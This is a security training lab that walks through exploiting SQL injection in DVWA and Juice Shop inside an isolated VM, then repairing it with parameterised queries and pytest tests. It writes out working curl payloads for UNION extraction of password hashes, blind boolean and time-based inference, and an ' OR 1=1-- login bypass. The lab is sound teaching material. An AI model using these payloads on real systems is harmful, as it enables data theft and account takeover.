---
title: "LAB-302-01 · SQL Injection and Its Fix"
description: "Confirm, exploit and then repair SQL injection in a local vulnerable application, with tests that prove both directions."
module_code: CYB-302
level: 3
kind: lab
prerequisites: [CYB-302]
estimated_minutes: 240
difficulty: intermediate
safety: isolated-vm
lab_ids: [LAB-302-01]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [sql-injection, dvwa, parameterisation, remediation, testing]
---

# LAB-302-01 · SQL Injection and Its Fix

## Scenario and background

DVWA's SQL Injection module is a four-line PHP page that takes an `id` and looks up a user. It is the cleanest
possible teaching target: you know the query, you know the data is synthetic, and the application is designed to
be broken.

You will work through all four detection techniques, extract data from a table the page was never meant to
expose, then write the parameterised version and prove with tests that the payload fails while the feature still
works. The last part is the deliverable a client actually keeps.

## Learning objectives

By the end of this lab you can:

1. Confirm that an input reaches the SQL parser using a single malformed request.
2. Determine the column count of a query and use it to build a union-based extraction.
3. Distinguish boolean-based from time-based inference by their preconditions.
4. Explain what the database user's privileges mean for the impact of the flaw.
5. Rewrite the vulnerable lookup with parameter binding and prove it with two tests.

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| DVWA | current `master` | `http://192.0.2.30:4280`, security level **Low** |
| Juice Shop | 20.3.0 | `http://192.0.2.30:3000` |
| `curl` | 7.81+ | With `-G` and `--data-urlencode` |
| Burp Suite Community | 2026.10.1 | Optional; Repeater is convenient |
| `sqlite3` | 3.37+ | For the repair exercise |
| Python 3 + `pytest` | 3.10+, 7.x | Regression tests |

!!! warning "Authorized scope — read before you begin"
    **Targets you may use:** `http://192.0.2.30:4280` (DVWA), `http://192.0.2.30:3000` (Juice Shop), and a
    SQLite file you create locally.
    **Targets you must not use:** any other host, any database containing real records, and any system where a
    lost `WHERE` clause would destroy data you did not create.

    **Do not use destructive statements.** No `DROP`, `DELETE`, `UPDATE`, or `INSERT` in this lab. You are
    reading synthetic rows, not modifying them — an accidental unqualified `DELETE` in a shared lab would be a
    data-loss incident, and in a real assessment it would end the engagement.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model

The simulated attacker is an authenticated low-privilege user of the application (DVWA requires login). The
vulnerability gives them the database user's reach: in DVWA that means the entire `dvwa` schema, including the
`users` table with password hashes. In a production equivalent, the impact would extend to whatever that account
can read — which is why the database account's privileges belong in the finding.

## Environment

| Host | Role | Address |
| --- | --- | --- |
| `lab-analyst` | Requests, proxy, repair workspace | 192.0.2.10 |
| `lab-web` | DVWA (container), Juice Shop (container) | 192.0.2.30 |

**Network view**

```text
lab-analyst 192.0.2.10                lab-web 192.0.2.30
  curl / browser ─────────────────▶ :4280 DVWA  (sqli module)
  curl ───────────────────────────▶ :3000 Juice Shop (/rest/user/login)
  repair/  local SQLite, no network
```

## Before you start

1. Snapshot `pre-lab-302-01`.
2. Log in to DVWA and save a cookie jar:

   ```bash
   mkdir -p ~/lab/level-3/lab-302-01/evidence
   cd ~/lab/level-3/lab-302-01

   curl -sS -c evidence/dvwa.jar -o /dev/null \
     -d 'username=admin&password=password&Login=Login' \
     http://192.0.2.30:4280/login.php
   ```

3. Confirm the session works and the module is reachable:

   ```bash
   curl -sS -b evidence/dvwa.jar \
     'http://192.0.2.30:4280/vulnerabilities/sqli/?id=1&Submit=Submit' \
     | grep -o 'First name:.*' | head -3
   ```

   **Expected:** one rendered result row. If you get the login page, the cookie jar is wrong — fix that before
   continuing.

**Why `-G --data-urlencode` for everything that follows:** the payloads contain spaces, quotes, and `#`. Building
the URL by hand produces silent encoding bugs, and a "payload that doesn't work" is usually an encoding problem
rather than a missing vulnerability.

## Procedure

### 1. Baseline, then one quote

```bash
U='http://192.0.2.30:4280/vulnerabilities/sqli/'

curl -sS -b evidence/dvwa.jar -G "$U" \
  --data-urlencode 'id=1' --data-urlencode 'Submit=Submit' \
  -o evidence/base.html

curl -sS -b evidence/dvwa.jar -G "$U" \
  --data-urlencode "id=1'" --data-urlencode 'Submit=Submit' \
  -o evidence/quote.html

diff <(sed 's/<[^>]*>//g' evidence/base.html | grep -v '^\s*$') \
     <(sed 's/<[^>]*>//g' evidence/quote.html | grep -v '^\s*$') | head -30
```

**Expected:** the quote request differs — typically a MySQL syntax error, or a body that renders no result row.
Either outcome means the input reached the parser. Record the exact text in your notes; it discloses the query's
shape.

### 2. Establish the column count

A union-based extraction needs the right number of columns and compatible types.

```bash
for n in 1 2 3 4; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' -b evidence/dvwa.jar -G "$U" \
    --data-urlencode "id=1' ORDER BY $n #" --data-urlencode 'Submit=Submit')
  echo "ORDER BY $n -> HTTP $code"
done
```

**Expected:** success for `ORDER BY 1` and `ORDER BY 2`, a failure at `ORDER BY 3`. That means **two columns** —
which matches the two fields the page displays.

**Why this order:** `ORDER BY` with an out-of-range column produces a database error rather than a visible
payload. It is the quietest way to count columns, and it works even when the page renders nothing useful.

### 3. Union-based extraction

With two columns confirmed, request data from a different table:

```bash
curl -sS -b evidence/dvwa.jar -G "$U" \
  --data-urlencode "id=1' UNION SELECT user, password FROM users #" \
  --data-urlencode 'Submit=Submit' \
  -o evidence/union-users.html

sed 's/<[^>]*>//g' evidence/union-users.html | grep -v '^\s*$' | head -20
```

**Expected:** the result table contains usernames and password hashes from the `users` table — rows the page was
never designed to return.

Now identify the current database and version, which tells you what other capabilities exist:

```bash
curl -sS -b evidence/dvwa.jar -G "$U" \
  --data-urlencode "id=1' UNION SELECT database(), version() #" \
  --data-urlencode 'Submit=Submit' | sed 's/<[^>]*>//g' | grep -v '^\s*$' | head
```

**Expected:** a schema name and a MySQL version string. Record them; the version determines which features
(and therefore which privilege escalations) are relevant, and it belongs in the report's environment section.

### 4. Boolean-based inference

Turn the response into one bit. This is the technique that works when errors are suppressed and output is
generic.

```bash
for cond in "1' AND '1'='1" "1' AND '1'='2"; do
  n=$(curl -sS -b evidence/dvwa.jar -G "$U" \
        --data-urlencode "id=$cond" --data-urlencode 'Submit=Submit' \
        | grep -c 'First name')
  echo "$cond -> result rows: $n"
done
```

**Expected:** the true condition returns a row (`1`), the false condition returns none (`0`). You now have a
one-bit oracle. Extracting a string with it is mechanical and slow — which is exactly why the next technique
exists.

### 5. Time-based inference

When the response body is identical in both cases, timing is the only channel.

```bash
time curl -sS -o /dev/null -b evidence/dvwa.jar -G "$U" \
  --data-urlencode "id=1' AND SLEEP(3) #" --data-urlencode 'Submit=Submit'
```

**Expected:** roughly three seconds of added latency compared with the baseline request. If the response is
instant, either the payload did not reach the parser or the engine does not support `SLEEP` (MySQL does; SQLite
does not — it has no `SLEEP` function at all).

**Why this matters beyond the lab:** time-based injection is what you use when you cannot see anything — blind,
error-suppressed, output-encrypted. It is also the technique most likely to be caught by rate limiting and
monitoring, which is worth noting in the defender's section of your report.

### 6. The same flaw, a worse consequence: authentication bypass

Juice Shop's login takes an email and a password. Test whether the email is interpolated:

```bash
J='http://192.0.2.30:3000/rest/user/login'

# 1. Malformed input: does the error change?
curl -sS -i -X POST "$J" -H 'Content-Type: application/json' \
  --data '{"email":"quote'"'"'test@lab.test","password":"x"}' | head -12

# 2. A condition that is true for the first row
curl -sS -i -X POST "$J" -H 'Content-Type: application/json' \
  --data "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}" | head -12
```

**Expected:** the malformed request produces a different error than a normal wrong password, and the second may
return `200` with a token — an authentication bypass. Behaviour varies between versions and build options, so
record what *your* instance does rather than expecting a specific status.

**Why this is the important half of the lab:** SQL injection in a search box leaks data. SQL injection in a login
form hands over an account. Same root cause, entirely different severity — and the severity argument must be
written, not assumed.

### 7. Build the repair workspace

Create the fixed feature and the seeded database:

```bash
mkdir -p repair/tests && cd repair
cat > app.py <<'PY'
import sqlite3

def get_user(db_path: str, user_id: str):
    """Return (first_name, last_name) for one id, or None.

    user_id is bound as data; it is never concatenated into the statement.
    """
    with sqlite3.connect(db_path) as conn:
        cur = conn.cursor()
        cur.execute(
            "SELECT first_name, last_name FROM users WHERE user_id = ?",
            (user_id,),
        )
        return cur.fetchone()
PY

cat > tests/test_injection.py <<'PY'
import sqlite3
import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
from app import get_user

def make_db(path):
    conn = sqlite3.connect(path)
    conn.execute("CREATE TABLE users (user_id TEXT, first_name TEXT, last_name TEXT)")
    conn.executemany(
        "INSERT INTO users VALUES (?,?,?)",
        [("1", "Amina", "Riaz"), ("2", "Bilal", "Khan")],
    )
    conn.commit()
    conn.close()
    return str(path)

def test_legitimate_lookup(tmp_path):
    db = make_db(tmp_path / "t.db")
    assert get_user(db, "1") == ("Amina", "Riaz")

def test_known_identity_payload_is_inert(tmp_path):
    db = make_db(tmp_path / "t.db")
    assert get_user(db, "1' OR '1'='1") is None

def test_union_payload_is_inert(tmp_path):
    db = make_db(tmp_path / "t.db")
    assert get_user(db, "1' UNION SELECT user, password FROM users #") is None
PY

python3 -m venv .venv && . .venv/bin/activate
pip install pytest
python -m pytest -q
```

**Expected:** three passing tests. If `test_known_identity_payload_is_inert` fails, the placeholder was not used —
check that the value is passed as a tuple, not formatted into the string.

### 8. Write the remediation note

In `evidence/remediation.md`, state: the vulnerable line, the fixed line, why the fix works (parse-then-bind),
the regression tests that guard it, and the residual items — the database account's privileges, and any
`ORDER BY`-style identifier that still needs an allowlist.

## Evidence to collect

- `evidence/base.html`, `evidence/quote.html` — baseline versus malformed input.
- `evidence/column-count.txt` — the four `ORDER BY` results.
- `evidence/union-users.html` — extracted rows (synthetic data).
- `evidence/boolean.txt` and `evidence/timing.txt` — inference results.
- `evidence/auth-bypass.txt` — the two login responses, with tokens redacted.
- `repair/` — `app.py` and `tests/`, plus `evidence/remediation.md`.
- `evidence/pytest.txt` — the passing test run.

## Verification

- [ ] A single quote changed the response, and you quoted the difference.
- [ ] Column count established as two, with the `ORDER BY` evidence.
- [ ] Union extraction returned rows from a table the page does not normally display.
- [ ] Both inference techniques recorded, including the precondition each needed.
- [ ] Login field tested for injection, with the observed behaviour stated (not assumed).
- [ ] `pytest` passes all three tests, including the two payload tests.
- [ ] No destructive statement was issued at any point.

## Teardown and reset

```bash
deactivate 2>/dev/null
```

Nothing in DVWA was modified, so no restore is needed. If you created files inside the web root during
experimentation, remove them. Revert `pre-lab-302-01` if the DVWA database was reset or its security level
changed. Keep `evidence/` and `repair/` — they are the deliverable.

## Reflection

1. `ORDER BY` revealed the column count without returning any data. Why is that a better first step than
   guessing with `UNION SELECT NULL, NULL`?
2. The time-based test is far slower than union-based extraction. Describe a realistic scenario where it is still
   the only option.
3. Injection in a search box and injection in a login form share a root cause. Explain why their severities
   differ, in terms of what the attacker gains.
4. Your fix binds the parameter. Name two things it does **not** fix, and where each belongs in the report.

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Technique coverage | One technique only | All four demonstrated | All four, with the precondition for each stated |
| Evidence quality | Screenshots without context | Requests and responses saved | Reproducible `curl` commands plus outputs and interpretation |
| Repair correctness | Fix described, not written | Parameterised version works | Parameterised version plus regression tests for two payloads |
| Impact analysis | "Critical SQLi" | Data exposure explained | Impact tied to database privileges, with the auth-bypass contrast |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Every request returns the login page | Cookie jar missing or expired | Re-run the login `curl` with `-c`, then use `-b` with the same file |
| `ORDER BY 2` also fails | Payload encoding dropped the space before `#` | Use `--data-urlencode`; `#` must be sent encoded |
| Union returns "different number of columns" | Column count wrong | Re-check with `ORDER BY`; DVWA's query selects two columns |
| `SLEEP()` returns instantly | Payload not reaching the parser, or non-MySQL backend | Confirm with the quote test; only MySQL/MariaDB support `SLEEP` |
| Juice Shop login returns `400` on the payload | Request body malformed JSON | Build the body with `jq -n --arg` instead of hand-escaping |
| `pytest` cannot import `app` | Working directory wrong | Run from `repair/`, or keep the `sys.path` line in the test |

## References

1. OWASP WSTG v4.2 — WSTG-INPV-05 Testing for SQL Injection.
2. OWASP SQL Injection Prevention Cheat Sheet. Accessed 2026-10-29.
3. OWASP Top 10:2025 — A05 Injection. <https://owasp.org/Top10/2025/>
4. DVWA source — `vulnerabilities/sqli/source/low.php` (the vulnerable query, for comparison with your fix).
5. Python `sqlite3` documentation — parameter substitution. Accessed 2026-10-29.
